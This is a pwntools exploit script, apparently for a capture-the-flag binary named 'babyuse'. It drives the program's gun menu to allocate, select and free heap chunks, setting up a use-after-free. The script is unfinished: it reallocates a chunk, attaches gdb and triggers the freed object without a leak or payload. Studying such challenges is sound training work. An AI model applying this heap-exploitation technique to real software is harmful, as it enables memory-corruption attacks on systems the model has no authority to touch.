from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
bin = ELF('babyuse')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def buy_gun(gun_type,length_name,name):
	cn.sendline('1')
	cn.recv()

	cn.sendline(str(gun_type))
	cn.recv()
	cn.sendline(str(length_name))
	cn.recv()
	cn.sendline(name)
	cn.recv()

def select_gun(gun_index):
	cn.sendline('2')
	cn.recv()

	cn.sendline(str(gun_index))
	cn.recv()

def drop_gun(gun_index):
	cn.sendline('6')
	cn.recv()

	cn.sendline(str(gun_index))
	cn.recv()

def rename_gun(gun_index,length_name,name):
	cn.sendline('4')
	cn.recv()

	cn.sendline(str(gun_index))
	cn.recv()
	cn.sendline(str(length_name))
	cn.recv()
	cn.sendline(name)
	cn.recv()


cn = process('./babyuse')

cn.recv()
#chunk_size = 4 + 4 + 0x10
buy_gun(1,0x50-1,'a'*0x50)
buy_gun(1,0x60-1,'b'*0x60)
buy_gun(1,2,'cc')
buy_gun(1,2,'dd')
select_gun(2)
drop_gun(0)
drop_gun(1)
drop_gun(2)
drop_gun(3)
buy_gun(1, 0x20000, 'a')
gdb.attach(cn)
raw_input()
cn.sendline('5')
raw_input()
cn.recv()

cn.interactive()
